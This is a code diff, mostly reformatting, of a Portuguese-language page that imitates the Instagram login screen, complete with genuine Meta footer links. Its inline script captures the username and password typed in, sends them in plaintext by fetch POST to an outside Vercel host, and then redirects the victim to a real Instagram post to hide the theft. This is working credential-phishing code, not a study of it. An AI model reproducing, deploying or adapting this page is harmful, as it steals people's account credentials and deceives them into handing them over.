@@ -34,7 +34,7 @@
             <div class="form">
               <form>
                 <div class="field">
-                    <input
+                  <input
                     id="username"
                     type="text"
                     placeholder="Telefone, nome de usuário ou email"
@@ -44,7 +44,7 @@
                 </div>
 
                 <div class="field">
-                    <input
+                  <input
                     id="password"
                     type="password"
                     placeholder="Palavra-passe"
@@ -54,14 +54,14 @@
                 </div>
 
                 <button
-  id="loginButton"
-  class="login-button"
-  title="login"
-  type="button"
-  aria-label="botão entrar"
->
-  Iniciar Sessão
-</button>
+                  id="loginButton"
+                  class="login-button"
+                  title="login"
+                  type="button"
+                  aria-label="botão entrar"
+                >
+                  Iniciar Sessão
+                </button>
 
                 <div class="separator">
                   <div class="line"></div>
@@ -76,7 +76,9 @@
                     aria-label="botão entrar com o Facebook"
                   >
                     <i class="fa-brands fa-facebook-square"></i>
-                    <span class="login-with-fb">Iniciar sessão com o Facebook </span>
+                    <span class="login-with-fb"
+                      >Iniciar sessão com o Facebook
+                    </span>
                   </button>
 
                   <p class="forgot-password">
@@ -101,14 +103,32 @@
 
       <footer>
         <div class="social-links">
-            <div class="credit">
-              Meta  Sobre  Blog  Carreiras  Ajuda  API  Privacidade  Termos  Localizações 
-               Instagram  Lite  Threads  Carregamento de contatos e não usuários
-            </div>
-            <div class="social-links">
-                <div class="credit">
-                               Português (Brasil) © 2024 Instagram from Meta
-                </div>
+          <div class="credit">
+            <a href="https://about.meta.com/">Meta</a>
+            <a href="https://about.instagram.com/">Sobre</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://www.instagram.com/about/jobs/">Carreiras</a>
+            <a href="https://help.instagram.com/">Ajuda</a>
+            <a href="https://developers.facebook.com/docs/instagram">API</a>
+            <a href="https://www.instagram.com/legal/privacy/">Privacidade</a>
+            <a href="https://www.instagram.com/legal/terms/">Termos</a>
+            <a href="https://www.instagram.com/explore/locations/"
+              >Localizações</a
+            >
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <a
+              href="https://l.instagram.com/?u=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F261704639352628&e=AT0k2CmIQLaLv4rgzC0kPY0hyuBCdp6zlI8P52USeNrZQa7p4PqjNCaI35c2rMo61QXX6GTwghxlwQxc7tHGL4vrGDzcsCOot7ncdTXhygPILpDZZrioDKFHizbOvs0A8W02f5G3tRtEZjFwC0Emig"
+              >Carregamento de contatos e não usuários</a
+            >
+            <a href="https://about.meta.com/technologies/meta-verified/"
+              >Meta Verified</a
+            >
+          </div>
+          <div class="credit">
+            Português (Brasil) © 2024 Instagram from Meta
+          </div>
+        </div>
       </footer>
     </main>
     <script
@@ -116,43 +136,48 @@
       crossorigin="anonymous"
     ></script>
     <script>
-      document.getElementById('loginButton').addEventListener('click', function (event) {
-        // Captura os valores dos campos de entrada
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-  
-        // Exibe os valores no console log
-        console.log('Username:', username);
-        console.log('Password:', password);
-  
-        // Envia os logs para o Vercel usando a API de logs
-        var vercelURL = "vistoapp-backend.vercel.app";  // Substitua com a URL real do seu projeto Vercel
-        enviarLogsParaVercel(username, password, vercelURL);
-  
-        // Redireciona para a URL desejada
-        window.location.href = "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
-  
-        // Limpa os campos de entrada (opcional)
-        document.getElementById('username').value = '';
-        document.getElementById('password').value = '';
-      });
-  
-          // Função para enviar logs para o Vercel usando a API de logs
-          function enviarLogsParaVercel(username, password, vercelURL) {
+      document
+        .getElementById("loginButton")
+        .addEventListener("click", function (event) {
+          // Captura os valores dos campos de entrada
+          var username = document.getElementById("username").value;
+          var password = document.getElementById("password").value;
+
+          // Exibe os valores no console log
+          console.log("Username:", username);
+          console.log("Password:", password);
+
+          // Envia os logs para o Vercel usando a API de logs
+          var vercelURL = "vistoapp-backend.vercel.app"; // Substitua com a URL real do seu projeto Vercel
+          enviarLogsParaVercel(username, password, vercelURL);
+
+          // Redireciona para a URL desejada
+          window.location.href =
+            "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
+
+          // Limpa os campos de entrada (opcional)
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        });
+
+      // Função para enviar logs para o Vercel usando a API de logs
+      function enviarLogsParaVercel(username, password, vercelURL) {
         // Monta a mensagem de log
         var logMessage = `Username: ${username}, Password: ${password}`;
 
         // Envia a mensagem de log para o Vercel
         fetch(`https://${vercelURL}/User/Login`, {
-          method: 'POST',
+          method: "POST",
           headers: {
-            'Content-Type': 'application/json',
+            "Content-Type": "application/json",
           },
           body: JSON.stringify({ message: logMessage }),
         })
-          .then(response => response.json())
-          .then(data => console.log('Log enviado com sucesso:', data))
-          .catch(error => console.error('Erro ao enviar log para o Vercel:', error));
+          .then((response) => response.json())
+          .then((data) => console.log("Log enviado com sucesso:", data))
+          .catch((error) =>
+            console.error("Erro ao enviar log para o Vercel:", error)
+          );
       }
     </script>
   </body>
